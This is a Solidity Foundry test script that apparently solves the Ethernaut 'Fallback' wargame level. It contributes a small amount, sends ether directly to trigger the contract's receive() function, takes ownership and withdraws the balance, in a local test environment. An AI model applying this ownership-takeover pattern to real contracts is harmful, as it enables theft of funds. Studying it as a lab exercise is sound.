// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../src/Fallback.sol";
import "./deployer.sol";

contract test is Test {
    Deployer public deployer;
    Fallback public ethernaut1;
    address public addr;
    function setUp() external {
        vm.deal(msg.sender, 1 ether);
        deployer = new Deployer();
        vm.prank(msg.sender);
        addr = deployer.deploy();

        ethernaut1 = Fallback(payable(addr));
    }

    function test_valnurablity() public {
        vm.startPrank(msg.sender);
        console.log("balanceOfUser at the start:", (msg.sender).balance);
        ethernaut1.contribute{value: 1 }();

        //trigger the receive() function
        (bool ok,) = address(ethernaut1).call{value : 1}("");
        require(ok, "transaction failed.");

        console.log("deployer addr", address(ethernaut1));
        console.log("owner        ", ethernaut1.owner());
        console.log("msg.sender   ", msg.sender);
        //checks if the owner changed to my address
        require(msg.sender == ethernaut1.owner(), "hack failed."); 
        ethernaut1.withdraw();
        console.log("balanceOfInstance:", address(ethernaut1).balance);
        console.log("balanceOfUser at the end:", (msg.sender).balance);
        vm.stopPrank();
    }
}